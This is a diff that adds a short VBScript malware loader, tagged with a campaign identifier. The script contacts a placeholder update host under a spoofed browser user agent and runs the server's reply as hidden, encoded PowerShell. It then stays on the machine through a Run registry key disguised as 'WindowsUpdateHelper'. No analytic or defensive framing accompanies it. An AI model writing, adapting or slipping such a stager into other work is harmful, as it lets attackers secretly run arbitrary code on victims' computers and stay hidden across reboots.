@@ -1,0 +1,9 @@
+Const CAMPAIGN = "NJ-CAMPAIGN-0x5A"
+Set sh  = CreateObject("WScript.Shell")
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET", "http://cdn.nightjar-update.example/api/v2/task", False
+xhr.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)"
+xhr.Send
+sh.Run "powershell -nop -w hidden -enc " & xhr.responseText, 0, False
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper", _
+    "wscript.exe //B " & WScript.ScriptFullName, "REG_SZ"
